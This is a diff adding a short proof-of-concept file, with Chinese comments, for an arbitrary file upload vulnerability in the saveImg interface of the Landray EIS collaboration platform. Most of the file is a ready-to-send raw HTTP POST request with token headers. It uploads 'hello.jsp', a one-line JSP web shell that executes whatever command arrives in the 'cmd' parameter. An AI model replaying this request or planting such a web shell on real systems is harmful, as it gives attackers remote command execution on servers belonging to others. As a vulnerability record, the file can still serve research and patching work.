@@ -1,0 +1,17 @@
+# 蓝凌EIS智慧协同平台saveImg任意文件上传漏洞
+# 蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。
+# 蓝凌EIS智慧协同平台saveImg接口未对上传文件进行限制造成任意文件上传漏洞。
+POST /eis/service/api.aspx?action=saveImg&acid=80052383&bid=hd_tag_m8mv24wi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24wi
+RM-PRO-Token: ca3b002c05b72c19714a758739449cf0
+RM-PRO-Time: 1742808419117
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu
+
+------WebKitFormBoundaryxdgaqmqu
+Content-Disposition: form-data; name="file"; filename="hello.jsp"
+Content-Type: text/html
+
+<% Process process = Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+------WebKitFormBoundaryxdgaqmqu--
